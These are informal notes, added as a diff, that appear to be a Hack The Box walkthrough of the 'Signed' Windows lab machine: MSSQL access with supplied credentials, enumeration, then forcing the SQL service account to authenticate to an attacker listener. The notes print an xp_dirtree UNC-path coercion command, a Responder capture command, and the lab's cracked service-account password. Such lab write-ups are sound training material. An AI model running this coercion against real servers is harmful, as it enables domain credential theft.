@@ -1,0 +1,172 @@
+Today, we will be trying some better note organization, using utilizing Grok AI, I believe the notes can be better structured and formatted, therefore better understood and with the concepts being clearly explained. 
+
+Hack The Box - Signed (Medium · Windows) 
+Difficulty: Medium
+OS: Windows
+Starting Point: Provided credentials for MSSQL access
+Credentials given by HTB:
+Username: scott
+Password: Sm230#C5NatH
+
+ping -c 3 10.129.8.253 
+
+PING 10.129.8.253 (10.129.8.253) 56(84) bytes of data.
+64 bytes from 10.129.8.253: icmp_seq=1 ttl=127 time=234 ms
+64 bytes from 10.129.8.253: icmp_seq=2 ttl=127 time=170 ms
+64 bytes from 10.129.8.253: icmp_seq=3 ttl=127 time=191 ms
+
+--- 10.129.8.253 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 169.836/198.410/233.908/26.611 ms
+
+
+so far we got good connection, 
+
+Reverse DNS Enumeration
+-----------------------------------
+- Performed `dig -x` and `nslookup`
+- PTR record resolves only to IP address
+- No hostname disclosed via DNS
+-------------
+
+## Nmap (Targeted)
+
+- Only port exposed externally: 1433/tcp (MSSQL)
+- SQL Server 2022 RTM
+- Host identified as Domain Controller
+
+### Identified Names
+- Domain: SIGNED.HTB
+- Hostname: DC01
+- FQDN: DC01.SIGNED.HTB
+-----------------------
+
+Browser → nothing loads
+
+Nmap → no HTTP/HTTPS ports open
+
+Only exposed service → MSSQL (1433)
+
+That means:
+
+There is nothing listening for a browser.
+
+so lets try for impacket-mssqlclient scott@DC01.SIGNED.HTB -windows-auth -> Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+
+Attempt 2 (SQL Authentication)
+impacket-mssqlclient scott@10.129.8.253 ---> Successful authentication
+TLS enforced automatically
+Connected to master database
+
+So far MSSQL is the only entry point
+
+now that we are in lets run basic enumeration queries, Confirm SQL Server version, -- List databases, sysadmin, etc..
+--->  Enumerate and understand our positioning.
+
+SELECT @@version;  -- Confirm SQL Server version
+
+Microsoft SQL Server 2022 (RTM)
+Enterprise Evaluation Edition
+Windows Server 2019 Standard (Build 17763)
+
+------------------------------
+
+SELECT SYSTEM_USER;
+Scott 
+
+-----------------------------
+SELECT USER_NAME();
+guest
+---------------
+SELECT IS_SRVROLEMEMBER('sysadmin');
+0
+----------------
+
+so no we do not have sysadmin role or permissions, 
+
+-----------------------
+
+authenticated but constrained
+
+inside SQL, not the OS
+
+on a Domain Controller
+
+SQL is not running as a user
+
+SQL is not misconfigured at first glance
+
+This is a controlled environment.
+
+--------> Any path forward must involve privilege escalation, not direct execution.
+
+We are not sysadmin, cannot execute much, but we should still be able to enumerate. Since this is SQL, there must be tables / functions that give clues to the next step.
+
+SELECT HAS_PERMS_BY_NAME('xp_dirtree', 'OBJECT', 'EXECUTE');
+result is 1
+
+xp_dirtree exists, Your current execution context can execute it, This permission does not require sysadmin, This permission is commonly granted to public
+
+You cannot execute arbitrary OS commands,
+but you can cause the SQL Server service to perform actions on your behalf.
+
+-----------------------------
+## Enumeration Direction Chosen
+
+### Filesystem Enumeration
+- xp_dirtree executable by current context
+- Operates in SQL Server service account context
+- Potential interaction with underlying Windows authentication
+
+### Database Object Enumeration
+- Next step to identify:
+  - Custom databases
+  - Stored procedures
+  - Jobs or linked functionality
+- Objective: understand why SQL exists on a DC
+----------------------------------------
+
+### Server principals (filtered)
+- sa (SQL_LOGIN) enabled
+- scott (SQL_LOGIN) enabled (created 2025-10-02)
+
+Observation: No WINDOWS_LOGIN / WINDOWS_GROUP principals visible in this filtered query.
+
+----------
+
+at this points lets just try to xp_dirtree coercion --> EXEC master..xp_dirtree '\\10.xx.xx.xx\anything', 1, 1; on the mssqlclient
+
+then on our other terminal sudo responder -I tun0 -v
+
+then ---> NTLMv2 hash: captured successfully
+
+---------------------------------
+
+
+## Enumeration Updates
+
+### msdb Permissions
+- Attempted: enumerate SQL Agent jobs via msdb
+- Result: SELECT denied on dbo.sysjobs (msdb)
+- Conclusion: msdb job metadata not readable with current privileges.
+
+### Filesystem / UNC Interaction
+- Confirmed EXECUTE on xp_dirtree is permitted.
+- Triggered outbound SMB auth using UNC path via xp_dirtree.
+
+#### Captured Authentication (SMB Listener)
+- Target IP: 10.129.8.253
+- Domain/User: SIGNED\mssqlsvc
+- Evidence: NTLMv2-SSP challenge/response captured successfully
+- Conclusion: SQL Server service account appears to be domain account `mssqlsvc`.
+-------------
+Next Step: Crack the NTLMv2 Hash
+
+Once Cracked: Domain Credentials
+Username: signed.htb\mssqlsvc
+Password: purPLE9795!@
+
+---------------------
+
+
+from here lets take a small break, wwe will be back soon
